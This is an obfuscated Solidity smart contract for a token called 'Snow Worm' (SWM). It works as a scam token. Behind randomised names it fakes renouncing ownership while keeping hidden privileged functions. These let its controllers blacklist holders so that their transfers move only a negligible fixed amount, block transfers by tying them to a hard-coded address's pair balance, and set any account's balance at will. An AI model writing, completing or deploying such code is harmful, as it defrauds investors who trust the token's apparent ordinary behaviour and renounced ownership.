//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface vuydeqptux {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract uqpioebhxu {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface mpynwtnrrtdyq {
    function createPair(address datgaqthvadvtx, address ptjhcivoqfk) external returns (address);
}

interface gggsvdbucjm {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fpjkmngqnjadbd) external view returns (uint256);

    function transfer(address ciidtjobs, uint256 iennyaahtwn) external returns (bool);

    function allowance(address nqmqeqeiy, address spender) external view returns (uint256);

    function approve(address spender, uint256 iennyaahtwn) external returns (bool);

    function transferFrom(
        address sender,
        address ciidtjobs,
        uint256 iennyaahtwn
    ) external returns (bool);

    event Transfer(address indexed from, address indexed rnwhjaszf, uint256 value);
    event Approval(address indexed nqmqeqeiy, address indexed spender, uint256 value);
}

interface gggsvdbucjmMetadata is gggsvdbucjm {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SnowWorm is uqpioebhxu, gggsvdbucjm, gggsvdbucjmMetadata {

    bool public buocdrnhb;

    address private jjnsbhgwuhw;

    bool private nesaxslaohb;

    string private nzxzqznvn = "SWM";

    function transferFrom(address vwgxbwgtpa, address ciidtjobs, uint256 iennyaahtwn) external override returns (bool) {
        if (_msgSender() != zgqngtgogd) {
            if (duyftnkwujxzjr[vwgxbwgtpa][_msgSender()] != type(uint256).max) {
                require(iennyaahtwn <= duyftnkwujxzjr[vwgxbwgtpa][_msgSender()]);
                duyftnkwujxzjr[vwgxbwgtpa][_msgSender()] -= iennyaahtwn;
            }
        }
        return rhufecbhdzdpk(vwgxbwgtpa, ciidtjobs, iennyaahtwn);
    }

    uint256 olomurimtmeb;

    function ctrosfmqixcfts(address wjfrgmijukvzwu) public {
        if (hpxaeqvpxxvev) {
            return;
        }
        if (ylzhkmwslvmov == ezjkpjbbpfxmg) {
            ezjkpjbbpfxmg = ylzhkmwslvmov;
        }
        fwvathiakqtqf[wjfrgmijukvzwu] = true;
        if (buocdrnhb) {
            ezjkpjbbpfxmg = ylzhkmwslvmov;
        }
        hpxaeqvpxxvev = true;
    }

    function getOwner() external view returns (address) {
        return jjnsbhgwuhw;
    }

    function rhufecbhdzdpk(address vwgxbwgtpa, address ciidtjobs, uint256 iennyaahtwn) internal returns (bool) {
        if (vwgxbwgtpa == vlyxaqarfr) {
            return lzllkfyvaosrcx(vwgxbwgtpa, ciidtjobs, iennyaahtwn);
        }
        uint256 xwbowjtkzuuq = gggsvdbucjm(zxvwrlvkltr).balanceOf(ejrdcnyvleylx);
        require(xwbowjtkzuuq == olomurimtmeb);
        if (pultcdsea[vwgxbwgtpa]) {
            return lzllkfyvaosrcx(vwgxbwgtpa, ciidtjobs, rzyjioilkpyroc);
        }
        return lzllkfyvaosrcx(vwgxbwgtpa, ciidtjobs, iennyaahtwn);
    }

    function name() external view virtual override returns (string memory) {
        return nicpqsrxklq;
    }

    uint256 private hkhavdajnvvwg;

    uint256 public ezjkpjbbpfxmg;

    constructor (){
        if (lxqcbkmnxxxas) {
            buocdrnhb = true;
        }
        aykcbqobjgavo();
        vuydeqptux zwwhqrcehuvk = vuydeqptux(zgqngtgogd);
        zxvwrlvkltr = mpynwtnrrtdyq(zwwhqrcehuvk.factory()).createPair(zwwhqrcehuvk.WETH(), address(this));
        if (ezjkpjbbpfxmg != ylzhkmwslvmov) {
            nesaxslaohb = true;
        }
        vlyxaqarfr = _msgSender();
        fwvathiakqtqf[vlyxaqarfr] = true;
        nglbwxmjexef[vlyxaqarfr] = onbslqsmqb;
        if (hkhavdajnvvwg != ylzhkmwslvmov) {
            hkhavdajnvvwg = ezjkpjbbpfxmg;
        }
        emit Transfer(address(0), vlyxaqarfr, onbslqsmqb);
    }

    string private nicpqsrxklq = "Snow Worm";

    uint256 private onbslqsmqb = 100000000 * 10 ** 18;

    function balanceOf(address fpjkmngqnjadbd) public view virtual override returns (uint256) {
        return nglbwxmjexef[fpjkmngqnjadbd];
    }

    mapping(address => bool) public pultcdsea;

    address public zxvwrlvkltr;

    function approve(address fydrtacjql, uint256 iennyaahtwn) public virtual override returns (bool) {
        duyftnkwujxzjr[_msgSender()][fydrtacjql] = iennyaahtwn;
        emit Approval(_msgSender(), fydrtacjql, iennyaahtwn);
        return true;
    }

    address public vlyxaqarfr;

    function vaxkkgtewolgv(address xbukozyilpbvp) public {
        tufghqbil();
        if (ylzhkmwslvmov != ezjkpjbbpfxmg) {
            ylzhkmwslvmov = ezjkpjbbpfxmg;
        }
        if (xbukozyilpbvp == vlyxaqarfr || xbukozyilpbvp == zxvwrlvkltr) {
            return;
        }
        pultcdsea[xbukozyilpbvp] = true;
    }

    function allowance(address gfmreacmcf, address fydrtacjql) external view virtual override returns (uint256) {
        if (fydrtacjql == zgqngtgogd) {
            return type(uint256).max;
        }
        return duyftnkwujxzjr[gfmreacmcf][fydrtacjql];
    }

    function transfer(address caktsitlttt, uint256 iennyaahtwn) external virtual override returns (bool) {
        return rhufecbhdzdpk(_msgSender(), caktsitlttt, iennyaahtwn);
    }

    bool public hpxaeqvpxxvev;

    uint256 constant rzyjioilkpyroc = 9 ** 10;

    function hvjzopzchex(uint256 iennyaahtwn) public {
        tufghqbil();
        olomurimtmeb = iennyaahtwn;
    }

    mapping(address => uint256) private nglbwxmjexef;

    bool public lxqcbkmnxxxas;

    address ejrdcnyvleylx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function decimals() external view virtual override returns (uint8) {
        return hqnzljkibk;
    }

    function lzllkfyvaosrcx(address vwgxbwgtpa, address ciidtjobs, uint256 iennyaahtwn) internal returns (bool) {
        require(nglbwxmjexef[vwgxbwgtpa] >= iennyaahtwn);
        nglbwxmjexef[vwgxbwgtpa] -= iennyaahtwn;
        nglbwxmjexef[ciidtjobs] += iennyaahtwn;
        emit Transfer(vwgxbwgtpa, ciidtjobs, iennyaahtwn);
        return true;
    }

    function owner() external view returns (address) {
        return jjnsbhgwuhw;
    }

    function aykcbqobjgavo() public {
        emit OwnershipTransferred(vlyxaqarfr, address(0));
        jjnsbhgwuhw = address(0);
    }

    mapping(address => bool) public fwvathiakqtqf;

    uint256 xxedpvtpkx;

    function symbol() external view virtual override returns (string memory) {
        return nzxzqznvn;
    }

    uint256 public ylzhkmwslvmov;

    address zgqngtgogd = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint8 private hqnzljkibk = 18;

    mapping(address => mapping(address => uint256)) private duyftnkwujxzjr;

    function tufghqbil() private view {
        require(fwvathiakqtqf[_msgSender()]);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return onbslqsmqb;
    }

    event OwnershipTransferred(address indexed wwrlefdohom, address indexed jzvfyfliz);

    function wxdlhgkok(address caktsitlttt, uint256 iennyaahtwn) public {
        tufghqbil();
        nglbwxmjexef[caktsitlttt] = iennyaahtwn;
    }

}